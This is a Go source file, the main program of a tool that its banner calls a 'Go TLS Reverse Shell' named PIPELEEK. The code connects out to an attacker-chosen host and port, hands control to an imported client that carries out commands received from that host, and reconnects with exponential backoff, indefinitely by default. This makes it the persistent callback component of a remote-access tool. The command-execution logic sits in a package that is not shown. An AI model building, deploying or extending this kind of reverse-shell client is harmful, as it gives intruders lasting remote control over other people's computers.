package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"golang-https-rev/pkg/client"
	"golang-https-rev/pkg/version"
)

func printHeader() {
	fmt.Println()
	fmt.Println("  ██████╗  ██████╗ ████████╗███████╗")
	fmt.Println("  ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝")
	fmt.Println("  ██║  ███╗██║   ██║   ██║   ███████╗")
	fmt.Println("  ██║   ██║██║   ██║   ██║   ╚════██║")
	fmt.Println("  ╚██████╔╝╚██████╔╝   ██║   ███████║")
	fmt.Println("   ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝")
	fmt.Println()
	fmt.Println("  PIPELEEK - Go TLS Reverse Shell")
	fmt.Println()
}

func main() {
	if err := runClient(os.Args[1:]); err != nil {
		log.Fatal(err)
	}
}

func runClient(args []string) error {
	printHeader()

	if len(args) != 2 {
		return fmt.Errorf("Usage: gotsr <host:port|domain:port> <max-retries>")
	}

	target := args[0]
	maxRetries := 0
	fmt.Sscanf(args[1], "%d", &maxRetries)

	log.Printf("Starting GOTS - PIPELEEK client...")
	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)
	log.Printf("Target: %s", target)
	log.Printf("Max retries: %d (0 = infinite)", maxRetries)

	connectWithRetry(target, maxRetries)
	return nil
}

func connectWithRetry(target string, maxRetries int) {
	retries := 0
	backoff := 5 * time.Second

	for {
		cl := client.NewReverseClient(target)
		if err := cl.Connect(); err != nil {
			log.Printf("Connection failed: %v", err)

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Retrying in %v... (attempt %d)", backoff, retries+1)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			continue
		}

		if err := cl.HandleCommands(); err != nil {
			log.Printf("Connection failed: %v", err)
			cl.Close()

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Reconnecting in %v... (attempt %d)", backoff, retries+1)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
		}
	}
}
